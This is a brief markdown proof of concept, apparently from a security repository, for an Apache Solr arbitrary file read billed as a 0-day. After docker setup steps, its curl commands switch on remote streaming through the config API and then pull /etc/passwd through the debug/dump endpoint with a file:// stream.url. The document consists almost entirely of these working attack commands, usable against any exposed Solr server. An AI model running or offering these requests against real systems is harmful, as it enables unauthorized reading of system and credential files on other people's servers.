# Apache Solr 0-day

#### References: 

* https://solr.apache.org/guide/8_8/requestdispatcher-in-solrconfig.html
* https://mp.weixin.qq.com/s/3WuWUGO61gM0dBpwqTfenQ 

#### Greetz : 本文作者  Skay @ QAX CERT

```
# stand up test on docker
docker run --name solrbear -d -p 8983:8983 -t solr
docker start solrbear

# create core
docker exec -it --user solr solrbear bin/solr create_core -c gettingstarted

# reload (or use Web ui)
curl -X POST http://localhost:8983/solr/admin/cores?core=gettingstarted&action=RELOAD

# push some data maybe
curl -X POST -d '{"add":{ "doc":{"id":"delete.me","title":"change.me"}}}' -H "Content-Type: application/json" http://localhost:8983/solr/gettingstarted/update?commit=true

# Enable remote stream
curl -H 'Content-type:application/json' -d '{"set-property": {"requestDispatcher.requestParsers.enableRemoteStreaming": true}, "set-property":{"requestDispatcher.requestParsers.enableStreamBody": true}}' http://localhost:8983/api/cores/gettingstarted/config

# Exploit
curl "http://localhost:8983/solr/gettingstarted/debug/dump?param=ContentStreams" -F "stream.url=file:///etc/passwd"

```
